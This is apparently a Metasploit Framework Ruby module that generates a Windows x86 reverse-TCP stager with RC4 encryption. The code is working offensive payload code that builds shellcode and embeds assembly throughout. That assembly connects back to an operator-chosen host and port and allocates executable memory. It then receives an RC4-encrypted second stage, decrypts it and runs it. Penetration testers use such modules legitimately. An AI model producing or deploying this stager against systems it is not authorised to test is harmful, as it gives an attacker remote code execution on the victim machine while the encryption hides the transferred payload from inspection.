# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/reverse_tcp'
require 'msf/core/payload/windows/rc4'

module Msf

###
#
# Complex reverse_tcp_rc4 payload generation for Windows ARCH_X86
#
###

module Payload::Windows::ReverseTcpRc4

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseTcp
  include Msf::Payload::Windows::Rc4

  #
  # Register reverse_tcp_rc4 specific options
  #
  def initialize(*args)
    super
    register_advanced_options([ OptString.new("RC4PASSWORD", [true, "Password to derive RC4 key from"]) ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate
    xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      xorkey:      xorkey,
      rc4key:      rc4key,
      reliable:    false
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp_rc4(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp_rc4(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_tcp(opts)}
      #{asm_block_recv_rc4(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_block_recv_rc4(opts={})
    xorkey = Rex::Text.to_dword(opts[:xorkey]).chomp
    asm = %Q^
      ; Same as block_recv, only that the length will be XORed and the stage will be RC4 decoded.
      ; Differences to block_recv are indented two more spaces.
      ; Compatible: block_bind_tcp, block_reverse_tcp
      ; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
      ; Output: None.
      ; Clobbers: EAX, EBX, ECX, EDX, ESI, (ESP will also be modified)
      recv:
      ; Receive the size of the incoming second stage...
        push  0x00             ; flags
        push  0x04             ; length = sizeof( DWORD );
        push esi               ; the 4 byte buffer on the stack to hold the second stage length
        push edi               ; the saved socket
        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
        call ebp               ; recv( s, &dwLength, 4, 0 );
      ; Alloc a RWX buffer for the second stage
        mov esi, [esi]         ; dereference the pointer to the second stage length
          xor esi, #{xorkey}   ; XOR the stage length
          lea ecx, [esi+0x100]  ; ECX = stage length + S-box length (alloc length)
        push  0x40         ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
      ; push esi               ; push the newly recieved second stage length.
          push ecx             ; push the alloc length
        push  0x00             ; NULL as we dont care where the allocation is.
        push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
      ; Receive the second stage and execute it...
      ;   xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
          lea ebx, [eax+0x100] ; EBX = new stage address
        push ebx               ; push the address of the new stage so we can return into it
          push esi             ; push stage length
          push eax             ; push the address of the S-box
      read_more:               ;
        push  0                ; flags
        push esi               ; length
        push ebx               ; the current address into our second stage's RWX buffer
        push edi               ; the saved socket
        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
        call ebp               ; recv( s, buffer, length, 0 );
        add ebx, eax           ; buffer += bytes_received
        sub esi, eax           ; length -= bytes_received
      ; test esi, esi          ; test length
        jnz read_more          ; continue if we have more to read
          pop ebx              ; address of S-box
          pop ecx              ; stage length
          pop ebp              ; address of stage
          push ebp             ; push back so we can return into it
          push edi             ; save socket
          mov edi, ebx         ; address of S-box
          call after_key       ; Call after_key, this pushes the address of the key onto the stack.
          db #{raw_to_db(opts[:rc4key])}
      after_key:
        pop esi                ; ESI = RC4 key
      #{asm_decrypt_rc4}
        pop edi              ; restore socket
      ret                    ; return into the second stage
      ^
  end

private

  def rc4_keys(rc4pass = '')
    m = OpenSSL::Digest.new('sha1')
    m.reset
    key = m.digest(rc4pass)
    [key[0,4], key[4,16]]
  end

end

end

